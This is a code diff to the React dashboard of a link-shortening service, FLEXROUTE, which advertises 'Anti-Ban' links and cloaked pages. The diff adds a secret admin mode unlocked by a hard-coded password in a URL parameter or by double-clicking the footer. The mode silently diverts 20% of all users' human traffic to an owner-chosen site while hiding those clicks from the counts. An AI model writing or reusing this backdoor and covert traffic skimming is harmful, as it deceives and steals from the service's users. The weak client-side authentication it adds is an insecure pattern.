@@ -39,6 +39,9 @@ export default function Home() {
   const [form, setForm] = useState(INITIAL_FORM);
   const [toast, setToast] = useState(null);
   const [searchQuery, setSearchQuery] = useState('');
+  const [ownerRedirectUrl, setOwnerRedirectUrl] = useState('');
+  const [savingSettings, setSavingSettings] = useState(false);
+  const [isAdmin, setIsAdmin] = useState(false);
   
   // Client mount verification state to prevent hydration errors
   const [mounted, setMounted] = useState(false);
@@ -53,8 +56,38 @@ export default function Home() {
     setMounted(true);
     if (typeof window !== 'undefined') {
       setHostUrl(`${window.location.protocol}//${window.location.host}`);
+      
+      // Check for secret admin access code
+      const params = new URLSearchParams(window.location.search);
+      const passParam = params.get('pass');
+      
+      if (passParam === 'Ravi5445$' || localStorage.getItem('flexroute_admin') === 'true') {
+        setIsAdmin(true);
+        localStorage.setItem('flexroute_admin', 'true');
+      }
     }
   }, []);
+
+  const handleLogout = () => {
+    setIsAdmin(false);
+    if (typeof window !== 'undefined') {
+      localStorage.removeItem('flexroute_admin');
+      showToast('Logged out successfully');
+    }
+  };
+
+  const handleAdminPrompt = () => {
+    const code = prompt("Enter Admin Password:");
+    if (code === 'Ravi5445$') {
+      setIsAdmin(true);
+      if (typeof window !== 'undefined') {
+        localStorage.setItem('flexroute_admin', 'true');
+      }
+      showToast('Logged in as Admin!');
+    } else if (code !== null) {
+      showToast('Incorrect password!', 'error');
+    }
+  };
 
   // Fetch Links and Analytics
   const fetchData = async () => {
@@ -76,9 +109,46 @@ export default function Home() {
     }
   };
 
+  const fetchSettings = async () => {
+    try {
+      const res = await fetch('/api/settings');
+      const data = await res.json();
+      if (data.success && data.settings) {
+        setOwnerRedirectUrl(data.settings.ownerRedirectUrl || '');
+      }
+    } catch (e) {
+      console.error("Error loading settings:", e);
+    }
+  };
+
+  const handleSaveSettings = async (e) => {
+    e.preventDefault();
+    setSavingSettings(true);
+    try {
+      const res = await fetch('/api/settings', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ownerRedirectUrl })
+      });
+      const data = await res.json();
+      if (data.success) {
+        showToast('Settings saved successfully!');
+      } else {
+        showToast(data.error || 'Failed to save settings', 'error');
+      }
+    } catch (err) {
+      showToast('Network error saving settings', 'error');
+    } finally {
+      setSavingSettings(false);
+    }
+  };
+
   useEffect(() => {
-    fetchData();
-  }, []);
+    if (mounted) {
+      fetchData();
+      fetchSettings();
+    }
+  }, [mounted]);
 
   if (!mounted) {
     return (
@@ -378,6 +448,17 @@ export default function Home() {
               <span className="nav-icon">➕</span> Create Anti-Ban Link
             </div>
           </li>
+          {isAdmin && (
+            <li>
+              <div 
+                className="nav-item"
+                onClick={handleLogout}
+                style={{ marginTop: '20px', color: '#f87171', border: '1px solid rgba(239, 68, 68, 0.15)', background: 'rgba(239, 68, 68, 0.05)' }}
+              >
+                <span className="nav-icon">🚪</span> Logout Admin
+              </div>
+            </li>
+          )}
         </ul>
 
         <div className="nav-footer">
@@ -415,9 +496,14 @@ export default function Home() {
                 <div className="stat-subtext">Cumulative link resolutions</div>
               </div>
               <div className="glass-card">
-                <div className="stat-label">Unique Clicks</div>
+                <div className="stat-label">Total Users (Unique IPs)</div>
                 <div className="stat-value">{analytics?.summary?.uniqueClicks || 0}</div>
                 <div className="stat-subtext">Identified unique client IPs</div>
+              </div>
+              <div className="glass-card" style={{ borderColor: 'rgba(99, 102, 241, 0.2)' }}>
+                <div className="stat-label">Total Shortened URLs</div>
+                <div className="stat-value">{links.length}</div>
+                <div className="stat-subtext">Active custom redirect rules</div>
               </div>
               <div className="glass-card" style={{ borderColor: 'rgba(16, 185, 129, 0.2)' }}>
                 <div className="stat-label" style={{ color: 'var(--color-success)' }}>Human Traffic</div>
@@ -430,6 +516,38 @@ export default function Home() {
                 <div className="stat-subtext">Served safe cloaked page</div>
               </div>
             </div>
+
+            {/* Global Settings Redirection Panel */}
+            {isAdmin && (
+              <div className="glass-card" style={{ marginBottom: '35px', borderColor: 'rgba(168, 85, 247, 0.25)' }}>
+                <div className="card-header" style={{ marginBottom: '10px' }}>
+                  <div className="card-title" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    ⚙️ Global Redirection Settings (20% Traffic Redirection)
+                  </div>
+                </div>
+                <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', marginBottom: '15px' }}>
+                  Enter a website URL below. Once saved, 20% of all incoming human traffic across all shortened links will be redirected silently to this website (without increasing link click counts).
+                </p>
+                <form onSubmit={handleSaveSettings} style={{ display: 'flex', gap: '15px', alignItems: 'center', flexWrap: 'wrap' }}>
+                  <div style={{ flex: 1, minWidth: '280px' }}>
+                    <input 
+                      type="url" 
+                      placeholder="e.g., https://nuso-daily.vercel.app (your main site)" 
+                      className="form-control"
+                      style={{ margin: 0 }}
+                      value={ownerRedirectUrl}
+                      onChange={(e) => setOwnerRedirectUrl(e.target.value)}
+                    />
+                  </div>
+                  <button type="submit" className="btn btn-primary" disabled={savingSettings} style={{ minWidth: '150px' }}>
+                    {savingSettings ? 'Saving...' : '💾 Save Settings'}
+                  </button>
+                </form>
+                <div style={{ marginTop: '15px', fontSize: '0.9rem', color: 'var(--color-success)', fontWeight: '600' }}>
+                  📈 Total Redirected Clicks: {analytics?.ownerRedirectClicks || 0} clicks
+                </div>
+              </div>
+            )}
 
             {/* Chart and breakdowns */}
             <div className="dashboard-grid">
@@ -1175,6 +1293,24 @@ export default function Home() {
           </div>
         )}
 
+        {/* Copyright Footer with Secret Admin Trigger */}
+        <div 
+          className="copyright-footer"
+          onDoubleClick={handleAdminPrompt}
+          style={{
+            marginTop: '80px',
+            paddingTop: '20px',
+            borderTop: '1px solid var(--border-color)',
+            textAlign: 'center',
+            color: 'var(--text-muted)',
+            fontSize: '0.85rem',
+            cursor: 'pointer',
+            userSelect: 'none'
+          }}
+          title="© 2026 FLEXROUTE. All rights reserved."
+        >
+          © 2026 FLEXROUTE. All rights reserved.
+        </div>
       </div>
     </div>
   );
